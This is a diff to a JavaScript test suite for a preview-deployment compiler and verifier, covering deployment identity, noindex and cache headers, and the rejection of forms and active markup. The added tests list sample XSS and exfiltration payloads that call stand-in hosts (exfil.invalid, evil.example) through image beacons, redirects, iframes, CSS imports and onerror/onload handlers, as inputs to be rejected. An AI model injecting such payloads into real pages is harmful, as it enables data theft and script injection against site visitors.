@@ -9,8 +9,8 @@ const HTML=['<!doctype html><html lang="en"><head><meta name="robots" content="n
 '<title>X1 Proof App</title></head><body><header><h1>X1 Build Proof</h1></header><main>',
 '<section><h2>Real application</h2><p>NOT A REAL BUSINESS. Synthetic noindex demonstration only.</p>',
 '<p>Shows real source commits, remote deploy and independent validation, with no customer data.</p>',
-'<button onclick="document.getElementById(\'c\').textContent=Number(document.getElementById(\'c\').textContent)+1">Test</button>',
-'<output id="c">0</output></section><section><h2>Second section</h2>',
+'<details><summary>Show proof</summary><output id="c">Opened</output></details>',
+'</section><section><h2>Second section</h2>',
 '<p>This is a nonproduction functional website from a bounded prompt-authoring packet.</p>',
 '<p>There are no cross-tenant claims, paid inference, checkout functions, fake business credentials, or customer contact.</p>',
 '<p>An immutable GitHub source SHA and Vercel preview deployment identify the exact delivered version.</p>',
@@ -36,6 +36,8 @@ test("valid pack contains immutable code and only Vercel preview files",()=>{
  assert.equal(p.sourcePath,"generated-previews/"+WORK+"/index.html");
  assert.deepEqual(p.vercelFiles.map(f=>f.file),["src/index.html","src/vercel.json"]);
  assert.match(p.vercelFiles[1].data,/noindex/);
+  assert.match(p.vercelFiles[1].data,/"Cache-Control"/);
+  assert.match(p.vercelFiles[1].data,/private, no-store/);
 });
 test("invalid action, identity, lease and task fail closed",()=>{
  for(const k of [{action_class:"READ_ONLY"},{action_class:"PRODUCTION_RELEASE"},
@@ -53,6 +55,52 @@ test("all safety gates reject protected release, real customers, payment and unk
  }
  const w=work();w.payload.postToSocial=true;
  assert.throws(()=>compileX1PreviewPack(w),/X1_UNEXPECTED_PAYLOAD_FIELD/);
+});
+test("synthetic preview denies all forms and submit overrides, including misleading safe targets",()=>{
+ const variants=[
+  '<form action="#" method="get"><input></form>',
+  '<form method="get" action="#"><input></form><form action="/relative"><input></form>',
+  '<form action="#"><button>Local demo</button></form><form action="//evil.example/save"><button>Other</button></form>',
+  '<form method="POST" action="#"><input name="message"></form>',
+  '<form action="#"><button formaction="/receive" type="submit">Submit</button></form>',
+  '<form action="#"><input type="submit" formaction="/receive"></form>',
+  '<button formmethod="post">Override</button>',
+  '<button formtarget="_blank">New window</button>',
+  '<input formenctype="multipart/form-data">',
+  '<FORM ACTION="#">Mixed case</FORM>',
+  '<form/action="#">Malformed syntax</form>'
+ ];
+ for(const fragment of variants){
+  const w=work();w.payload.files=[{path:"index.html",content:HTML.replace("</main>",fragment+"</main>")}];
+  assert.throws(()=>compileX1PreviewPack(w),/X1_FORM_MUST_BE_LOCAL_DEMO/,fragment);
+ }
+ // Existing local click-only demonstration remains functional; no form submission path.
+ assert.equal(compileX1PreviewPack(work()).sourceSha256,sha(HTML));
+});
+
+test("synthetic preview denies executable markup and outbound navigation",()=>{
+ assert.match(HTML,/<details><summary>/);
+ const variants=[
+  '<button onclick="new Image().src=&#39;//exfil.invalid/collect&#39;">Click</button>',
+  '<script>window.location.href="//exfil.invalid/collect"</script>',
+  '<a href="//exfil.invalid/collect">Leave preview</a>',
+  '<iframe src="//exfil.invalid/frame"></iframe>',
+  '<img src="x" onerror="location.assign(1)">',
+  '<style>@import "//exfil.invalid/site.css"</style>',
+  '<div style="background:url(//exfil.invalid/pixel)">CSS leak</div>',
+  '<meta http-equiv="refresh" content="0;url=//exfil.invalid/">',
+  '<svg onload="alert(1)"></svg>',
+  '<object data="//exfil.invalid/embed"></object>',
+  '<img srcset="//exfil.invalid/1 1x">'
+ ];
+ for(const fragment of variants){
+  const w=work();w.payload.files=[{path:"index.html",content:HTML.replace("</main>",fragment+"</main>")}];
+  assert.throws(()=>compileX1PreviewPack(w),/X1_EXECUTABLE_MARKUP_DENIED/,fragment);
+ }
+ const policy=compileX1PreviewPack(work()).vercelFiles[1].data;
+ assert.match(policy,/Content-Security-Policy/);
+ assert.match(policy,/script-src 'none'/);
+ assert.match(policy,/connect-src 'none'/);
 });
 test("no unreviewed paths, scripts, forms, personal data or external requests",()=>{
  for(const html of [
@@ -97,8 +145,8 @@ test("network provider commits exact source and deploys via existing GitHub/Verc
    if(url.endsWith("/git/commits"))return reply({sha:COMMIT});
    if(url.endsWith("/git/refs"))return reply({object:{sha:COMMIT}});
    if(url.includes("api.vercel.com/v13/deployments?"))return reply({deployment:{id:DEPLOY_ID,url:URL.replace("https://","").replace(/\/$/,""),target:null,alias:[]}});
-   if(url.includes("/v13/deployments/"+DEPLOY_ID))return reply({deployment:{readyState:"READY"}});
-   if(url===URL)return reply(HTML,200,{"x-robots-tag":"noindex,nofollow"});
+   if(url.includes("/v13/deployments/"+DEPLOY_ID))return reply({deployment:{id:DEPLOY_ID,projectId:"prj_JbkX4yKWygqBFRhkHL6nbeQXM46f",target:null,alias:[],url:URL.replace("https://","").replace(/\/$/,""),meta:{x1Packet:WORK,x1SourceSha:COMMIT,x1HtmlHash:sha(HTML),x1Release:"PREVIEW_ONLY"},readyState:"READY"}});
+   if(url===URL)return reply(HTML,200,{"x-robots-tag":"noindex,nofollow","cache-control":"private, no-store"});
    throw Error("Unexpected URL: "+url);
   }
  });
@@ -137,4 +185,235 @@ test("browser validator failure prevents a success receipt",async()=>{
   deployPreview:async()=>({id:DEPLOY_ID,url:URL,target:null}),
   verifyDeployed:async()=>{throw new Error("INDEPENDENT_VALIDATION_REQUIRED");}
  }),/INDEPENDENT_VALIDATION_REQUIRED/);
+});
+
+test("deployment artifact identity rejects wrong ID, project, target, aliases, URL, and metadata",async()=>{
+ const pack=compileX1PreviewPack(work());
+ const good={id:DEPLOY_ID,projectId:"prj_JbkX4yKWygqBFRhkHL6nbeQXM46f",target:null,alias:[],
+  url:URL.replace("https://","").replace(/\/$/,""),
+  meta:{x1Packet:WORK,x1SourceSha:COMMIT,x1HtmlHash:sha(HTML),x1Release:"PREVIEW_ONLY"},
+  readyState:"READY"};
+ const bad=[
+  ["wrong deployment id",{id:"dpl_Wrong"}, "X1_DEPLOYMENT_IDENTITY_MISMATCH"],
+  ["wrong project",{projectId:"prj_wrong"}, "X1_DEPLOYMENT_IDENTITY_MISMATCH"],
+  ["production target",{target:"production"}, "X1_RELEASE_TARGET_DENIED"],
+  ["alias",{alias:["customer.example"]}, "X1_RELEASE_TARGET_DENIED"],
+  ["wrong preview url",{url:"different.vercel.app"}, "X1_DEPLOYMENT_URL_MISMATCH"],
+  ["wrong request",{meta:{...good.meta,x1Packet:"wrong"}}, "X1_DEPLOYMENT_ARTIFACT_MISMATCH"],
+  ["wrong source",{meta:{...good.meta,x1SourceSha:"e".repeat(40)}}, "X1_DEPLOYMENT_ARTIFACT_MISMATCH"],
+  ["wrong html",{meta:{...good.meta,x1HtmlHash:"f".repeat(64)}}, "X1_DEPLOYMENT_ARTIFACT_MISMATCH"],
+  ["production release metadata",{meta:{...good.meta,x1Release:"PRODUCTION"}}, "X1_DEPLOYMENT_ARTIFACT_MISMATCH"],
+  ["missing metadata",{meta:null}, "X1_DEPLOYMENT_ARTIFACT_MISMATCH"]
+ ];
+ for(const [name,change,code] of bad){
+  let browserFetches=0;
+  const provider=createX1PreviewHttpProvider({githubToken:"fake",vercelToken:"fake",
+   fetchImpl:async(url)=>{
+    if(url.includes("/v13/deployments/"+DEPLOY_ID))
+     return new Response(JSON.stringify({deployment:{...good,...change}}),{status:200});
+    browserFetches++;
+    return new Response(HTML,{status:200,headers:{"x-robots-tag":"noindex","cache-control":"private, no-store"}});
+   }});
+  await assert.rejects(()=>provider.verifyDeployed(pack,{id:DEPLOY_ID,url:URL},COMMIT),new RegExp(code),name);
+  assert.equal(browserFetches,0,"must reject before public fetch: "+name);
+ }
+});
+test("deployment identity requires the exact source commit and preserves NON_PRODUCTION_MUTATION",async()=>{
+ const pack=compileX1PreviewPack(work());
+ let requests=0;
+ const provider=createX1PreviewHttpProvider({githubToken:"fake",vercelToken:"fake",
+  fetchImpl:async()=>{requests++;throw Error("should not be reached");}});
+ await assert.rejects(()=>provider.verifyDeployed(pack,{id:DEPLOY_ID,url:URL},"not-sha"),/X1_DEPLOY_SOURCE_REQUIRED/);
+ assert.equal(requests,0);
+ assert.throws(()=>compileX1PreviewPack(work({action_class:"PREVIEW_WRITE"})),/X1_NONPRODUCTION_ACTION_REQUIRED/);
+});
+
+
+test("real Vercel nested project response accepts only exact X1 preview identity",async()=>{
+ const pack=compileX1PreviewPack(work());
+ const baseLive={id:DEPLOY_ID,project:{id:"prj_JbkX4yKWygqBFRhkHL6nbeQXM46f"},
+  target:null,alias:[],url:URL.replace("https://","").replace(/\/$/,""),
+  meta:{x1Packet:WORK,x1SourceSha:COMMIT,x1HtmlHash:sha(HTML),x1Release:"PREVIEW_ONLY"},
+  readyState:"READY"};
+ const cases=[
+  ["exact nested project",{},null],
+  ["different nested project",{project:{id:"prj_other"}},"X1_DEPLOYMENT_IDENTITY_MISMATCH"],
+  ["missing project object",{project:null},"X1_DEPLOYMENT_IDENTITY_MISMATCH"],
+  ["unexpected alias",{alias:["unexpected.example"]},"X1_RELEASE_TARGET_DENIED"],
+  ["unknown artifact metadata",{meta:{}},"X1_DEPLOYMENT_ARTIFACT_MISMATCH"]
+ ];
+ for(const [name,change,errorCode] of cases){
+  let providerReads=0,htmlReads=0;
+  const provider=createX1PreviewHttpProvider({githubToken:"fake",vercelToken:"fake",
+   fetchImpl:async(url)=>{
+    if(url.includes("/v13/deployments/"+DEPLOY_ID)){
+     providerReads++;
+     return new Response(JSON.stringify({...baseLive,...change}),{status:200});
+    }
+    if(url===URL){
+     htmlReads++;
+     return new Response(HTML,{status:200,headers:{"x-robots-tag":"noindex,nofollow","cache-control":"private, no-store"}});
+    }
+    throw new Error("unexpected provider request");
+   }});
+  if(errorCode){
+   await assert.rejects(()=>provider.verifyDeployed(pack,{id:DEPLOY_ID,url:URL},COMMIT),new RegExp(errorCode),name);
+   assert.equal(htmlReads,0,name+" must fail before browser fetch");
+  } else {
+   await provider.verifyDeployed(pack,{id:DEPLOY_ID,url:URL},COMMIT);
+   assert.equal(htmlReads,1,name+" must validate exact HTML");
+  }
+  assert.equal(providerReads,1,name+" must use one resolved deployment");
+ }
+});
+
+test("contradictory flat and nested project identities fail before HTML fetch",async()=>{
+ const pack=compileX1PreviewPack(work());
+ const project="prj_JbkX4yKWygqBFRhkHL6nbeQXM46f";
+ const base={id:DEPLOY_ID,project:{id:project},target:null,alias:[],
+  url:URL.replace("https://","").replace(/\/$/,""),
+  meta:{x1Packet:WORK,x1SourceSha:COMMIT,x1HtmlHash:sha(HTML),x1Release:"PREVIEW_ONLY"},
+  readyState:"READY"};
+ const cases=[
+  ["nested only",{},false],
+  ["flat only",{project:undefined,projectId:project},false],
+  ["both agree",{projectId:project},false],
+  ["flat valid nested invalid",{projectId:project,project:{id:"prj_wrong"}},true],
+  ["flat invalid nested valid",{projectId:"prj_wrong"},true],
+  ["flat explicitly null nested valid",{projectId:null},true],
+  ["both project identifiers missing",{project:undefined},true]
+ ];
+ for(const [name,change,shouldReject] of cases){
+  let htmlReads=0,providerReads=0;
+  const provider=createX1PreviewHttpProvider({githubToken:"synthetic-gh",vercelToken:"synthetic-vercel",
+   fetchImpl:async(url)=>{
+    if(url.includes("/v13/deployments/"+DEPLOY_ID)){
+     providerReads++;
+     return new Response(JSON.stringify({...base,...change}),{status:200});
+    }
+    if(url===URL){
+     htmlReads++;
+     return new Response(HTML,{status:200,headers:{"x-robots-tag":"noindex,nofollow","cache-control":"private, no-store"}});
+    }
+    throw new Error("unexpected request");
+   }});
+  if(shouldReject){
+   await assert.rejects(()=>provider.verifyDeployed(pack,{id:DEPLOY_ID,url:URL},COMMIT),
+    /X1_DEPLOYMENT_IDENTITY_MISMATCH/,name);
+   assert.equal(htmlReads,0,name+" must deny before HTML fetch");
+  }else{
+   await provider.verifyDeployed(pack,{id:DEPLOY_ID,url:URL},COMMIT);
+   assert.equal(htmlReads,1,name+" should validate HTML once");
+  }
+  assert.equal(providerReads,1,name+" should verify one deployment identity");
+ }
+});
+
+test("missing explicit preview attestation rejects before HTML fetch",async()=>{
+ const pack=compileX1PreviewPack(work());
+ const base={id:DEPLOY_ID,project:{id:"prj_JbkX4yKWygqBFRhkHL6nbeQXM46f"},
+  target:null,alias:[],url:URL.replace("https://","").replace(/\/$/,""),
+  meta:{x1Packet:WORK,x1SourceSha:COMMIT,x1HtmlHash:sha(HTML),x1Release:"PREVIEW_ONLY"},
+  readyState:"READY"};
+ const cases=[
+  ["target omitted",{target:undefined}],
+  ["non-null preview target",{target:"preview"}],
+  ["aliases omitted",{alias:undefined}],
+  ["aliases null",{alias:null}],
+  ["aliases malformed",{alias:{}}],
+  ["aliases populated",{alias:["production.example"]}]
+ ];
+ for(const [name,change] of cases){
+  let htmlReads=0,providerReads=0;
+  const provider=createX1PreviewHttpProvider({githubToken:"synthetic-gh",vercelToken:"synthetic-vercel",
+   fetchImpl:async(url)=>{
+    if(url.includes("/v13/deployments/"+DEPLOY_ID)){
+     providerReads++;
+     return new Response(JSON.stringify({...base,...change}),{status:200});
+    }
+    if(url===URL){htmlReads++;return new Response(HTML,{status:200});}
+    throw new Error("unexpected request");
+   }});
+  await assert.rejects(()=>provider.verifyDeployed(pack,{id:DEPLOY_ID,url:URL},COMMIT),
+   /X1_RELEASE_TARGET_DENIED/,name);
+  assert.equal(htmlReads,0,name+" must deny before HTML fetch");
+  assert.equal(providerReads,1,name+" must examine one provider deployment");
+ }
+});
+
+test("served preview requires explicit X-Robots-Tag noindex directive",async()=>{
+ const pack=compileX1PreviewPack(work());
+ const live={id:DEPLOY_ID,project:{id:"prj_JbkX4yKWygqBFRhkHL6nbeQXM46f"},
+  target:null,alias:[],url:URL.replace("https://","").replace(/\/$/,""),
+  meta:{x1Packet:WORK,x1SourceSha:COMMIT,x1HtmlHash:sha(HTML),x1Release:"PREVIEW_ONLY"},
+  readyState:"READY"};
+ const cases=[
+  ["missing header",{},true],
+  ["explicit index",{"x-robots-tag":"index,follow"},true],
+  ["lookalike directive",{"x-robots-tag":"not-noindex-allowed"},true],
+  ["conflicting index token",{"x-robots-tag":"noindex, index"},true],
+  ["agent-scoped only noindex",{"x-robots-tag":"googlebot: noindex"},true],
+  ["unknown directive mixed with noindex",{"x-robots-tag":"noindex, follow"},true],
+  ["safe declared complete policy",{"x-robots-tag":"noindex, nofollow, noarchive"},false],
+  ["case insensitive",{"x-robots-tag":"NoIndex, nofollow"},false],
+  ["space-separated directive",{"x-robots-tag":"nofollow noindex"},false]
+ ];
+ for(const [name,headers,deny] of cases){
+  let providerReads=0,htmlReads=0;
+  const provider=createX1PreviewHttpProvider({githubToken:"synthetic-gh",vercelToken:"synthetic-vercel",
+   fetchImpl:async url=>{
+    if(url.includes("/v13/deployments/"+DEPLOY_ID)){
+     providerReads++;
+     return new Response(JSON.stringify({deployment:live}),{status:200});
+    }
+    if(url===URL){
+     htmlReads++;
+     return new Response(HTML,{status:200,headers:{"cache-control":"private, no-store",...headers}});
+    }
+    throw new Error("unexpected provider request");
+   }});
+  const check=()=>provider.verifyDeployed(pack,{id:DEPLOY_ID,url:URL},COMMIT);
+  if(deny)await assert.rejects(check,/X1_LIVE_NOINDEX_MISSING/,name);
+  else await check();
+  assert.equal(providerReads,1,name+" must validate exact provider identity");
+  assert.equal(htmlReads,1,name+" must inspect the actual served response header");
+ }
+});
+test("served preview requires private no-store response cache policy",async()=>{
+ const pack=compileX1PreviewPack(work());
+ const live={id:DEPLOY_ID,project:{id:"prj_JbkX4yKWygqBFRhkHL6nbeQXM46f"},
+  target:null,alias:[],url:URL.replace("https://","").replace(/\/$/,""),
+  meta:{x1Packet:WORK,x1SourceSha:COMMIT,x1HtmlHash:sha(HTML),x1Release:"PREVIEW_ONLY"},
+  readyState:"READY"};
+ const cases=[
+  ["header omitted",{},true],
+  ["public cache",{"cache-control":"public, max-age=0"},true],
+  ["cacheable private",{"cache-control":"private, max-age=3600"},true],
+  ["no-store without private",{"cache-control":"no-store"},true],
+  ["private without no-store",{"cache-control":"private"},true],
+  ["conflicting public",{"cache-control":"public, private, no-store"},true],
+  ["shared cache token",{"cache-control":"private, no-store, s-maxage=60"},true],
+  ["declared policy",{"cache-control":"private, no-store"},false],
+  ["case insensitive",{"cache-control":"Private, No-Store"},false]
+ ];
+ for(const [name,cacheHeaders,deny] of cases){
+  let providerReads=0,htmlReads=0;
+  const provider=createX1PreviewHttpProvider({githubToken:"synthetic-gh",vercelToken:"synthetic-vercel",
+   fetchImpl:async url=>{
+    if(url.includes("/v13/deployments/"+DEPLOY_ID)){
+     providerReads++;
+     return new Response(JSON.stringify({deployment:live}),{status:200});
+    }
+    if(url===URL){
+     htmlReads++;
+     return new Response(HTML,{status:200,headers:{"x-robots-tag":"noindex,nofollow",...cacheHeaders}});
+    }
+    throw new Error("unexpected provider request");
+   }});
+  const check=()=>provider.verifyDeployed(pack,{id:DEPLOY_ID,url:URL},COMMIT);
+  if(deny)await assert.rejects(check,/X1_LIVE_CACHE_POLICY_MISMATCH/,name);
+  else await check();
+  assert.equal(providerReads,1,name+" must verify exact provider artifact");
+  assert.equal(htmlReads,1,name+" must inspect served response headers");
+ }
 });
